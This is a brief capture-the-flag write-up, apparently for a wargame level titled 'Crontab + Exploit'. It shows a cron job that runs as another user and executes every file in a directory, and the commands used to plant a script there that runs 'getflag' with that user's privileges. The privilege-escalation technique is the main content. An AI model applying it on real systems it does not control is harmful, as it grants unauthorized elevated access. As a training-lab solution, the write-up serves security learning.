## Défi 5  Crontab + Exploit

### Commandes réalisées

```bash
cat /var/mail/level05
cat /usr/sbin/openarenaserver
vim /opt/openarenaserver/exploit # (add "getflag > /tmp/code" inside)
chmod +x /opt/openarenaserver/exploit
watch -n 5 'cat /tmp/code; cat /opt/openarenaserver/exploit'
```

### The Outputs

```bash
# Crontask
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

# bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

### Exploit
```bash
getflag > /tmp/code
```
